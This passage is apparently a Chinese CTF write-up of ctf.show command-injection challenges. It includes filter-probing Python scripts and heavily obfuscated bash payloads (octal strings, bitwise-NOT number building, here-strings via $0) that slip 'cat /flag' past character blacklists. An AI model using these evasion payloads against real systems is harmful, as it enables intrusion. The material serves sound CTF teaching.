class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里包含了个check.php,这里是先执行check()方法，在执行system()方法，那么我们可能会在check处进行类似die()方法一样进行终止，所以我们得想办法绕过。</p><p><img src="../images/image-20230220110524677.png" alt="image-20230220110524677"></p><p>测试的时候发现输入被过滤的内容时，会返回??????，所以我们可以写个python脚本来跑一下，看过滤了那些内容，还有看一下哪些内容可以进行利用。</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="comment">#这里填写自己的靶机网址</span></span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>等1跑完的时候，就可以看到结果了。</p><p><img src="../images/image-20230220110934152.png" alt="image-20230220110934152"></p><p>只有这些可以进行利用，很明显，？被过滤了。</p><p>禁用了问号，不能使用通配符的方式了，但是可以通过<code>$&#39;\xxx&#39;</code>的方式执行命令，其中xxx是ascii字母的8进制值，比如<code>ls</code> 可以通过<code>$&#39;\154\163&#39;</code> 的方式进行执行。</p><p><img src="../images/image-20230220111453793.png" alt="image-20230220111453793"></p><p>值得注意的是，<strong>这种方案并不能解析带有参数的命令</strong>，所以本题提供了<code>/getflag</code>来方便大家执行。</p><p>这种题其实也可以使用16进制进行利用，但是这里把字母给过滤了，所以16进制就不能用了  —-&gt;  /x53  (16进制)</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$<span class="string">&#x27;\57\147\145\164\146\154\141\147&#x27;</span></span><br></pre></td></tr></table></figure><p>这里时getflag是题目给的，所以就可以构造/getflag </p><h2 id="极限命令执行3"><a href="#极限命令执行3" class="headerlink" title="极限命令执行3"></a>极限命令执行3</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是先跑下python脚本，看哪些被过滤了。</p><p><img src="../images/image-20230220113626987.png" alt="image-20230220113626987"></p><p>数字只剩下01可以进行利用了，那么我们就得想别的方法了，这里先想到的是构造数字，<strong>web57</strong>讲了一下</p><p><img src="../images/image-20230220113814158.png" alt="image-20230220113814158"></p><p>可以利用这个姿势进行构造。这里的话<strong>~</strong>是取反符号</p><p>这里补充一下一个知识点  <a href="https://blog.csdn.net/K346K346/article/details/86752313">Shell 双引号和单引号的区别</a></p><p>这里利用$~()来构造所需要的数字</p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"> </span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i)+ <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span>+<span class="built_in">str</span>+<span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>以后如果想要修改啥的话，直接修改a里面的值就行了。</p><p>那么就可以拿到构造好的数字了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$\&#x27;\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>这里多出\符号是进行转义使用的。</p><p><img src="../images/image-20230220163149310.png" alt="image-20230220163149310"></p><p>成功输出想要的东西</p><p>/getflag的八进制模式</p><p>但是这里的话是没有进行命令执行，只是进行输出而已。</p><p>这里引入bash的一个语法<code>&lt;&lt;&lt;</code>三个小于号(here-strings)，语法：command [args] &lt;&lt;&lt;[“]$word[“]；$word会展开并作为command的stdin。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt;&lt; string</span><br><span class="line">command 是 Shell 命令，string 是字符串。将字符串通过标准输入，传递给命令</span><br><span class="line">这里因为字母被过滤了，bash就用不了了，那么我们就可以使用别的方法进行替代</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0就是bash的另一个写法</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220163600991.png" alt="image-20230220163600991"></p><p>那么我们就可以尝试去使用here-strings的方法进行命令执行了</p><p><img src="../images/image-20230220163915706.png" alt="image-20230220163915706"></p><p>输出了1，但是本题用不了，因为题目没有提示在/getflag下。</p><p>所以我们就只能进行<strong>cat /flag</strong>了</p><p>这里的话，$’ xxx ‘执行时不能使用带参的方法的，那么我们要解决这个问题的话就得使用两次<strong>here-strings</strong>的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（这里是因为bash把这一个字符串当作整体，而没有把空格作为分隔符正确解析）</span><br></pre></td></tr></table></figure><p>修改后的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a = r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">r&quot;\ 1 4 3 \ 1 4 1 \ 1 6 4 \ 4 0 \ 5 7 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i) + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span> + <span class="built_in">str</span> + <span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>只需要把a进行修改就行了</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>这里的话特殊点就是在使用第二次<strong>here-strings</strong>的方法的时候，得进行转义处理</p><p><strong>官方wp</strong></p><p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc</a>  </p><p>这个使用的是</p><p>禁用了除了<code>01</code>以外的数字，这里需要理解bash对于整数的表示形式是<code>[base#]n</code>的形式，比方说如果一个十进制数4，可以表示为二进制数100，那么在bash里可以表示为<code>2#100</code>。</p><p>所以在现有条件下，我们只要通过位运算<code>$((1&lt;&lt;1))</code>构造出2，就可以通过这种形式来构造任意数字了，比方说<code>ls</code>就是<code>$(($((1&lt;&lt;1))#10011010))     $(($((1&lt;&lt;1))#10100011))</code></p><p><strong>官方payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure><h2 id="极限命令执行4"><a href="#极限命令执行4" class="headerlink" title="极限命令执行4"></a>极限命令执行4</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220165224512.png" alt="image-20230220165224512"></p><p>遇到过滤的会输出??????,那么我们就可以使用一下脚本跑一下哪些东西可以进行利用</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里填写自己的靶机网址</span></span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>: <span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url, data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220165407967.png" alt="image-20230220165407967"></p><p>这里的话比上一题少了个零，但是用上一题的解法的话，可以直接通杀。</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p><strong>官方wp</strong></p><p>就是想办法来构造1</p><p><img src="../images/image-20230220165528116.png" alt="image-20230220165528116"></p><p><code>#</code>是计算字符串长度，两个<code>#</code>中，第一个#是计算字符串长度 第二个#是字符串的名字。$#的值是0，字符串长度为1，所以<code>$</code>是1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里\$$&#123;#&#125;，虽然输出是$0,但是并不按$0来解析</span><br></pre></td></tr></table></figure><p>还是构造 <strong>cat /flag</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure><p>就是把1替换成$就行了</p><h2 id="极限命令执行5"><a href="#极限命令执行5" class="headerlink" title="极限命令执行5"></a>极限命令执行5</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是先跑一下py脚本，看哪些参数可以进行利用</p><p><img src="../images/image-20230220172921706.png" alt="image-20230220172921706"></p><p>01都得了，这里的话我们可以通过~$()来构造数字，但是0，没了我们就得想八法来构造$0来构造bash了。</p><p>1、是<code>$&#123;!xxx&#125;</code>的用法，举一个很简单的例子：</p><p><img src="../images/image-20230220173724959.png" alt="image-20230220173724959"></p><p>所以其实在这里，只要想办法构造一个变量，变量值是0，就可以很容易的拿到<code>$0</code>了</p><p>其实在出题过程中，使用命令行进行测试，可以通过<code>$&#123;!?&#125;</code>和<code>$&#123;!#&#125;</code>的形式拿到<code>bash</code></p><p>但是很可惜，在php的system环境下没有实现，不然可以做到更极限</p><p><img src="../images/image-20230220173758701.png" alt="image-20230220173758701"></p><p>所以仅能通过定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0，然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh</code>字符。两条命令间通过<code>&amp;&amp;</code>进行连接。至于为什么是两个下划线，是因为bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0和$&#123;0&#125;输出的是一个意思</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220174141641.png" alt="image-20230220174141641"></p><p><img src="../images/image-20230220173839677.png" alt="image-20230220173839677"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里不用<span class="variable">$_</span>的意思是因为<span class="variable">$_</span>有自己的意思，就是记录上一次的值</span><br></pre></td></tr></table></figure><p>2、是<code>~</code>操作，<code>#</code>被禁用，<code>~</code>是按位取反操作，我们可以通过<code>$(())</code>取到0，然后对0进行按位取反，可以得到-1，很多个-1进行排列 可以得到-2、-3、-4、-5、-6、-7、-8，然后再按位取反就可以得到1、2、3、4、5、6、7。（这个操作是web入门57的姿势，有兴趣大家可以去做一下）</p><p><img src="../images/-16768858935023.png" alt="img"></p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a = r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">r&quot;\ 1 4 3 \ 1 4 1 \ 1 6 4 \ 4 0 \ 5 7 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> 